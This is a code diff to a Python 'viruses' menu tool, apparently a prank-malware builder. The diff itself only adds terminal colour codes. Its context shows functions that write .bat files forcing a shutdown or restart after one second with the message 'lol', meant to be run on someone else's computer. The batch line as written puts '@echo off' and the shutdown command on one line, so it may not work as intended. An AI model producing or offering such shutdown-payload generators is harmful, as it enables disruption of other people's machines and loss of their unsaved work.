@@ -957,7 +957,7 @@ def viruses():
                                                                  '''
 	print(banner)
 	text = '''
-	  \033[36m[1]-Bat-viruses
+	  \033[36m[1]-\033[33mBat-viruses
 	  \033[36m[2]-
 	  \033[36m[3]-
 
@@ -994,13 +994,13 @@ def viruses():
 		bat = int(input('\033[31mbat-virus\033[39m~#:'))
 		def bat1():
 			os.chdir('batniki')
-			n = str(input('Имя вашего батника .bat :'))
+			n = str(input('\033[35mИмя вашего батника .bat :'))
 			k = open(n,"w",encoding='utf-8')
 			k.write("""@echo off shutdown -s -t 1 -c "lol" >nul""")
 			k.close()
 		def bat2():
 			os.chdir('batniki')
-			n = str(input('Имя вашего батника .bat :'))
+			n = str(input('\033[35mИмя вашего батника .bat :'))
 			k = open(n,"w",encoding='utf-8')
 			k.write("""@echo off shutdown -r -t 1 -c "lol" >nul""")
 			k.close()
